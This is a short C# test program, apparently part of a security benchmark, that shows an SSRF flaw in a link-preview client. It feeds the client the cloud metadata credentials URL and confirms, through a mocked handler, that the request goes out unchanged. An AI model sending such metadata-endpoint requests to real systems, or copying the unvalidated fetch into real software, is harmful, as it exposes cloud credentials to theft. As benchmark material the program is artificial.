using System.Net;
using Secwest.Benchmarks.Services;

var attackerTarget = new Uri("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
var handler = new RecordingHandler("instance-role-secret");
using var client = new HttpClient(handler);
var preview = new PreviewClient(client);

var body = await preview.FetchAsync(attackerTarget.AbsoluteUri, CancellationToken.None);
if (handler.RequestedUri != attackerTarget || body != "instance-role-secret")
{
    throw new InvalidOperationException("Expected the attacker URI to reach the outbound request unchanged.");
}

Console.WriteLine("Vulnerable SSRF witness requested the attacker-controlled link-local URI.");

internal sealed class RecordingHandler(string body) : HttpMessageHandler
{
    public Uri? RequestedUri { get; private set; }

    protected override Task<HttpResponseMessage> SendAsync(
        HttpRequestMessage request,
        CancellationToken cancellationToken
    )
    {
        RequestedUri = request.RequestUri;
        return Task.FromResult(
            new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = new StringContent(body),
            }
        );
    }
}
